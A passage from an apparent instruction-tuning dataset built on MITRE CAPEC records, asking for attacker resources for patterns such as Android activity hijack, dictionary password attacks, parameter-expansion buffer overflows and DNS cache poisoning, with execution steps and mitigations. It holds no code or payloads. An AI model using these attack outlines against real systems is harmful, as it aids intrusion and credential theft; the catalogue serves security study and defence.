              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Protocol Analysis (CAPEC ID: 192), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nDepending on the type of analysis, a variety of tools might be required, such as static code and/or dynamic analysis tools. Alternatively, the effort might require debugging programs such as ollydbg, SoftICE, or disassemblers like IDA Pro. In some instances, packet sniffing or packet analyzing programs such as TCP dump or Wireshark are necessary. Lastly, specific protocol analysis might require tools such as PDB (Protocol Debug), or packet injection tools like pcap or Nemesis.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Depending on the type of analysis, a variety of tools might be required, such as static code and/or dynamic analysis tools. Alternatively, the effort might require debugging programs such as ollydbg, SoftICE, or disassemblers like IDA Pro. In some instances, packet sniffing or packet analyzing programs such as TCP dump or Wireshark are necessary. Lastly, specific protocol analysis might require tools such as PDB (Protocol Debug), or packet injection tools like pcap or Nemesis.",
      "@Name": "Protocol Analysis (CAPEC ID: 192)",
      "attack_ptrn": {
        "@ID": "192",
        "@Name": "Protocol Analysis",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary engages in activities to decipher and/or decode protocol information for a network or application communication protocol used for transmitting information between interconnected nodes or systems on a packet-switched data network. While this type of analysis involves the analysis of a networking protocol inherently, it does not require the presence of an actual or physical network.",
        "Extended_Description": {
          "xhtml:p": "Although certain techniques for protocol analysis benefit from manipulating live 'on-the-wire' interactions between communicating components, static or dynamic analysis techniques applied to executables as well as to device drivers, such as network interface drivers, can also be used to reveal the function and characteristics of a communication protocol implementation. Depending upon the methods used the process may involve observing, interacting, and modifying actual communications occurring between hosts. The goal of protocol analysis is to derive the data transmission syntax, as well as to extract the meaningful content, including packet or content delimiters used by the protocol. This type of analysis is often performed on closed-specification protocols, or proprietary protocols, but is also useful for analyzing publicly available specifications to determine how particular implementations deviate from published specifications."
        },
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Low",
        "Prerequisites": {
          "Prerequisite": [
            "Access to a binary executable.",
            "The ability to observe and interact with a communication channel between communicating processes."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Knowlegde of the Open Systems Interconnection model (OSI model), and famililarity with Wireshark or some other packet analyzer."
          }
        },
        "Resources_Required": {
          "Resource": "Depending on the type of analysis, a variety of tools might be required, such as static code and/or dynamic analysis tools. Alternatively, the effort might require debugging programs such as ollydbg, SoftICE, or disassemblers like IDA Pro. In some instances, packet sniffing or packet analyzing programs such as TCP dump or Wireshark are necessary. Lastly, specific protocol analysis might require tools such as PDB (Protocol Debug), or packet injection tools like pcap or Nemesis."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data",
              "Note": "Successful deciphering of protocol information compromises the confidentiality of future sensitive communications."
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data",
              "Note": "Modifying communications after successful deciphering of protocol information compromises integrity."
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "326"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-57",
              "@Section": "Proprietary protocol"
            },
            {
              "@External_Reference_ID": "REF-50",
              "@Section": "Reverse engineering"
            }
          ]
        },
        "Notes": {
          "Note": {
            "@Type": "Other",
            "xhtml:p": [
              "There are several challenges inherent to protocol analysis depending upon the nature of the protocol being analyzed. There may also be other types of factors which complicate the process such as encryption or ad hoc obfuscation of the protocol. In general there are two kinds of networking protocols, each associated with its own challenges and analysis approaches or methodologies. Some protocols are human-readable, which is to say they are text-based protocols. Examples of these types of protocols include HTTP, SMTP, and SOAP. Additionally, application-layer protocols can be embedded or encapsulated within human-readable protocols in the data portion of the packet. Typically, human-readable protocol implementations are susceptible to automatic decoding by the appropriate tools, such as Wireshark/ethereal, tcpdump, or similar protocol sniffers or analyzers.",
              "The presence of well-known protocol specifications in addition to easily identified protocol delimiters, such as Carriage Return or Line Feed characters (CRLF) result in text-based protocols susceptibility to direct scrutiny through manual processes. Protocol analysis against protocol implementations such as HTTP is often performed to identify idiosyncratic implementations of a protocol by a server or client. In the case of application-layer protocols which are embedded within text-based protocols, analysis techniques typically benefit from the well-known nature of the encapsulating protocols and can focus on discovering the semantic characteristics of the proprietary protocol or API, since the syntax and protocol delimiters of the underlying protocols can be readily identified.",
              "When performing protocol analysis of machine-readable (non-text-based) protocols difficulties emerge as the protocol itself was designed to be read by computing process. Such protocols are typically composed entirely in binary with no apparent syntax, grammar, or structural boundaries. Examples of these types of protocols are IP, UDP, and TCP. Binary protocols with published specifications can be automatically decoded by protocol analyzers, but in the case of proprietary, closed-specification, binary protocols there are no immediate indicators of packet syntax such as packet boundaries, delimiters, or structure, or the presence or absence of encryption or obfuscation. In these cases there is no one technology that can extract or reveal the structure of the packet on the wire, so it is necessary to use trial and error approaches while observing application behavior based on systematic mutations introduced at the packet-level. Tools such as Protocol Debug (PDB) or other packet injection suites are often employed. In cases where the binary executable is available, protocol analysis can be augmented with static and dynamic analysis techniques."
            ]
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Activation_Zone, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Other_Notes, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Protocol Reverse Engineering"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Android Activity Hijack (CAPEC ID: 501)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Android Activity Hijack (CAPEC ID: 501):\nMalware capable of acting on the adversary's objectives.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Malware capable of acting on the adversary's objectives.",
      "@Name": "Android Activity Hijack (CAPEC ID: 501)",
      "attack_ptrn": {
        "@ID": "501",
        "@Name": "Android Activity Hijack",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary intercepts an implicit intent sent to launch a Android-based trusted activity and instead launches a counterfeit activity in its place. The malicious activity is then used to mimic the trusted activity's user interface and prompt the target to enter sensitive data as if they were interacting with the trusted activity.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "499"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "173",
              "Exclude_Related": {
                "@Exclude_ID": "403"
              }
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Find an android application that uses implicit intents] Since this attack only works on android applications that use implicit intents, rather than explicit intents, an adversary must first identify an app that uses implicit intents to launch an Android-based trusted activity, and what that activity is."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Create a malicious app] The adversary must create a malicious android app meant to intercept implicit intents to launch an Adroid-based trusted activity. This malicious app will mimic the trusted activiy's user interface to get the user to enter sensitive data.",
              "Technique": "Specify the type of intent wished to be intercepted in the malicious app's manifest file using an intent filter"
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Get user to download malicious app] The adversary must get a user using the targeted app to download the malicious app by any means necessary"
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Gather sensitive data through malicious app] Once the target application sends an implicit intent to launch a trusted activity, the malicious app will be launched instead that looks identical to the interface of that activity. When the user enters sensitive information it will be captured by the malicious app.",
              "Technique": "Gather login information from a user using a malicious app"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have previously installed the malicious application onto the Android device that will run in place of the trusted activity."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "The adversary must typically overcome network and host defenses in order to place malware on the system."
          }
        },
        "Resources_Required": {
          "Resource": "Malware capable of acting on the adversary's objectives."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "To mitigate this type of an attack, explicit intents should be used whenever sensitive data is being sent. An 'explicit intent' is delivered to a specific application as declared within the intent, whereas an 'implicit intent' is directed to an application as defined by the Android operating system. If an implicit intent must be used, then it should be assumed that the intent will be received by an unknown application and any response should be treated accordingly (i.e., with appropriate security controls).",
            "Never use implicit intents for inter-application communication."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "923"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-427",
            "@Section": "3.1.2 Activity Hijacking"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated @Name, Description, Prerequisites"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2020-12-17",
            "#text": "Activity Hijack"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Code Inclusion (CAPEC ID: 175)",
    "context": "",
    "output": "required resources:\nThe adversary may need the capability to host code modules if they wish their own code files to be included.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary may need the capability to host code modules if they wish their own code files to be included.",
      "@Name": "Code Inclusion (CAPEC ID: 175)",
      "attack_ptrn": {
        "@ID": "175",
        "@Name": "Code Inclusion",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary exploits a weakness on the target to force arbitrary code to be retrieved locally or from a remote location and executed. This differs from code injection in that code injection involves the direct inclusion of code while code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Very High",
        "Prerequisites": {
          "Prerequisite": [
            "The target application must include external code/libraries that are executed when the application runs and the adversary must be able to influence the specific files that get included.",
            "The victim must run the targeted application, possibly using the crafted parameters that the adversary uses to identify the code to include."
          ]
        },
        "Resources_Required": {
          "Resource": "The adversary may need the capability to host code modules if they wish their own code files to be included."
        },
        "Example_Instances": {
          "Example": "One example of this type of attack pattern is PHP file include attacks where the parameter of an include() function is set by a variable that an attacker is able to control. The result is that arbitrary code could be loaded into the PHP application and executed."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "829"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2017-05-01",
            "Modification_Comment": "Updated Activation_Zone, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Dictionary-based Password Attack (CAPEC ID: 16), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nA machine with sufficient resources for the job (e.g. CPU, RAM, HD). Applicable dictionaries are required. Also a password cracking tool or a custom script that leverages the dictionary database to launch the attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A machine with sufficient resources for the job (e.g. CPU, RAM, HD). Applicable dictionaries are required. Also a password cracking tool or a custom script that leverages the dictionary database to launch the attack.",
      "@Name": "Dictionary-based Password Attack (CAPEC ID: 16)",
      "attack_ptrn": {
        "@ID": "16",
        "@Name": "Dictionary-based Password Attack",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": {
          "xhtml:p": [
            "An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.",
            "Dictionary Attacks differ from similar attacks such as Password Spraying (CAPEC-565) and Credential Stuffing (CAPEC-600), since they leverage unknown username/password combinations and don't care about inducing account lockouts."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "49"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "600"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "560"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "561"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "653"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine application's/system's password policy] Determine the password policies of the target application/system.",
              "Technique": [
                "Determine minimum and maximum allowed password lengths.",
                "Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).",
                "Determine account lockout policy (a strict account lockout policy will prevent brute force attacks)."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Select dictionaries] Pick the dictionaries to be used in the attack (e.g. different languages, specific terminology, etc.)",
              "Technique": [
                "Select dictionary based on particular users' preferred languages.",
                "Select dictionary based on the application/system's supported languages."
              ]
            },
            {
              "Step": "3",
              "Phase": "Explore",
              "Description": "[Determine username(s) to target] Determine username(s) whose passwords to crack.",
              "Technique": [
                "Obtain username(s) by sniffing network packets.",
                "Obtain username(s) by querying application/system (e.g. if upon a failed login attempt, the system indicates whether the entered username was valid or not)",
                "Obtain usernames from filesystem (e.g. list of directories in C:\\Documents and Settings\\ in Windows, and list in /etc/passwd in UNIX-like systems)"
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Use dictionary to crack passwords.] Use a password cracking tool that will leverage the dictionary to feed passwords to the system and see if they work.",
              "Technique": [
                "Try all words in the dictionary, as well as common misspellings of the words as passwords for the chosen username(s).",
                "Try common combinations of words in the dictionary, as well as common misspellings of the combinations as passwords for the chosen username(s)."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system uses one factor password based authentication.",
            "The system does not have a sound password policy that is being enforced.",
            "The system does not implement an effective password throttling mechanism."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "A variety of password cracking tools and dictionaries are available to launch this type of an attack."
          }
        },
        "Resources_Required": {
          "Resource": "A machine with sufficient resources for the job (e.g. CPU, RAM, HD). Applicable dictionaries are required. Also a password cracking tool or a custom script that leverages the dictionary database to launch the attack."
        },
        "Indicators": {
          "Indicator": "Many invalid login attempts are coming from the same machine (same IP address) or for the same log in name. The login attempts use passwords that are dictionary words."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Create a strong password policy and ensure that your system enforces this policy.",
            "Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.",
            "Leverage multi-factor authentication for all authentication services."
          ]
        },
        "Example_Instances": {
          "Example": [
            "A system user selects the word \"treacherous\" as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.",
            {
              "xhtml:p": [
                "The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks.",
                "Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server.",
                "Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques."
              ],
              "#text": "See also: CVE-2003-1096"
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "521"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "654"
            },
            {
              "@CWE_ID": "307"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Consequences, Description, Mitigations, Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Buffer Overflow via Parameter Expansion (CAPEC ID: 47)",
    "context": "",
    "output": "The resources required to execute Buffer Overflow via Parameter Expansion (CAPEC ID: 47) are the following: Access to the program source or binary. If the program is only available in binary then a disassembler and other reverse engineering tools will be helpful.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Access to the program source or binary. If the program is only available in binary then a disassembler and other reverse engineering tools will be helpful.",
      "@Name": "Buffer Overflow via Parameter Expansion (CAPEC ID: 47)",
      "attack_ptrn": {
        "@ID": "47",
        "@Name": "Buffer Overflow via Parameter Expansion",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "In this attack, the target software is given input that the adversary knows will be modified and expanded in size during processing. This attack relies on the target software failing to anticipate that the expanded data may exceed some internal limit, thereby creating a buffer overflow.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "100"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. Adversaries often look for applications that accept user input and that perform manual memory management."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.",
              "Technique": "In this attack, the normal method of providing large user input does not work. The program performs bounds checking on the user input, but not the expanded user input. The adversary needs to provide input that they believe will be expanded by the program to overflow a buffer. To identify where this is possible, an adversary either needs to have knowledge of the inner workings of the program or use a disassembler and other reverse engineering tools to guide the search."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft overflow content] The adversary crafts the input to be given to the program. If the intent is to simply cause the software to crash, the input needs only to expand to an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft input that expands in a way that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.",
              "Technique": "Create specific files and directories on the system and then give input using path traversal shortcuts to those directories that could expand past an input buffer."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Overflow the buffer] Using the injection vector, the adversary gives the crafted input to the program, overflowing the buffer."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The program expands one of the parameters passed to a function with input controlled by the user, but a later function making use of the expanded parameter erroneously considers the original, not the expanded size of the parameter.",
            "The expanded parameter is used in the context where buffer overflow may become possible due to the incorrect understanding of the parameter size (i.e. thinking that it is smaller than it really is)."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Finding this particular buffer overflow may not be trivial. Also, stack and especially heap based buffer overflows require a lot of knowledge if the intended goal is arbitrary code execution. Not only that the adversary needs to write the shell code to accomplish their goals, but the adversary also needs to find a way to get the program execution to jump to the planted shell code. There also needs to be sufficient room for the payload. So not every buffer overflow will be exploitable, even by a skilled adversary."
          }
        },
        "Resources_Required": {
          "Resource": "Access to the program source or binary. If the program is only available in binary then a disassembler and other reverse engineering tools will be helpful."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Ensure that when parameter expansion happens in the code that the assumptions used to determine the resulting size of the parameter are accurate and that the new size of the parameter is visible to the whole system"
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": [
                "Attack Example: FTP glob()",
                "The glob() function in FTP servers has been susceptible to attack as a result of incorrect resizing. This is an ftpd glob() Expansion LIST Heap Overflow Vulnerability. ftp daemon contains a heap-based buffer overflow condition. The overflow occurs when the LIST command is issued with an argument that expands into an oversized string after being processed by glob().",
                "This buffer overflow occurs in memory that is dynamically allocated. It may be possible for adversaries to exploit this vulnerability and execute arbitrary code on the affected host.",
                "To exploit this, the adversary must be able to create directories on the target host.",
                "The glob() function is used to expand short-hand notation into complete file names. By sending to the FTP server a request containing a tilde (~) and other wildcard characters in the pathname string, a remote adversary can overflow a buffer and execute arbitrary code on the FTP server to gain root privileges. Once the request is processed, the glob() function expands the user input, which could exceed the expected length. In order to exploit this vulnerability, the adversary must be able to create directories on the FTP server.",
                "[REF-1]"
              ],
              "#text": "See also: CVE-2001-0249"
            },
            {
              "xhtml:p": [
                "Buffer overflow in the glob implementation in libc in NetBSD-current before 20050914, and NetBSD 2.* and 3.* before 20061203, as used by the FTP daemon, allows remote authenticated users to execute arbitrary code via a long pathname that results from path expansion.",
                "The limit computation of an internal buffer was done incorrectly. The size of the buffer in byte was used as element count, even though the elements of the buffer are 2 bytes long. Long expanded path names would therefore overflow the buffer."
              ],
              "#text": "See also: CVE-2006-6652"
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "120"
            },
            {
              "@CWE_ID": "119"
            },
            {
              "@CWE_ID": "118"
            },
            {
              "@CWE_ID": "130"
            },
            {
              "@CWE_ID": "131"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "680"
            },
            {
              "@CWE_ID": "697"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Example_Instances, Skills_Required"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: DNS Cache Poisoning (CAPEC ID: 142)",
    "context": "",
    "output": "required resources:\nThe adversary must have the resources to modify the targeted cache. In addition, in most cases the adversary will wish to host the sites to which users will be redirected, although in some cases redirecting to a third party site will accomplish the adversary's goals.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must have the resources to modify the targeted cache. In addition, in most cases the adversary will wish to host the sites to which users will be redirected, although in some cases redirecting to a third party site will accomplish the adversary's goals.",
      "@Name": "DNS Cache Poisoning (CAPEC ID: 142)",
      "attack_ptrn": {
        "@ID": "142",
        "@Name": "DNS Cache Poisoning",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "A domain name server translates a domain name (such as www.example.com) into an IP address that Internet hosts use to contact Internet resources. An adversary modifies a public DNS cache to cause certain names to resolve to incorrect addresses that the adversary specifies. The result is that client applications that rely upon the targeted cache for domain name resolution will be directed not to the actual address of the specified domain name but to some other address. Adversaries can use this to herd clients to sites that install malware on the victim's computer or to masquerade as part of a Pharming attack.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "141"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "89"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Explore resolver caches] Check DNS caches on local DNS server and client's browser with DNS cache enabled.",
              "Technique": [
                "Run tools that check the resolver cache in the memory to see if it contains a target DNS entry.",
                "Figure out if the client's browser has DNS cache enabled."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt sending crafted records to DNS cache] A request is sent to the authoritative server for target website and wait for the iterative name resolver. An adversary sends bogus request to the DNS local server, and then floods responses that trick a DNS cache to remember malicious responses, which are wrong answers of DNS query.",
              "Technique": [
                "Adversary must know the transaction ID by intercepting a DNS query, or sending a bogus query with known transaction ID.",
                "If the transaction ID used to identify each query instance is randomized in some new DNS software, the attack must guess the transaction ID. Slow the response of the real DNS server by causing Denial-of-service. This gives adversaries enough time to guess transaction",
                "Adversary crafts DNS response with the same transaction ID as in the request. The adversary sends out DNS responses before the authorized DNS server. This forces DNS local cache stores fake DNS response (wrong answer). The fake DNS responses usually include a malicious website's IP address."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Redirect users to malicious website] As the adversary succeeds in exploiting the vulnerability, the victim connects to a malicious site using a good web site's domain name.",
              "Technique": [
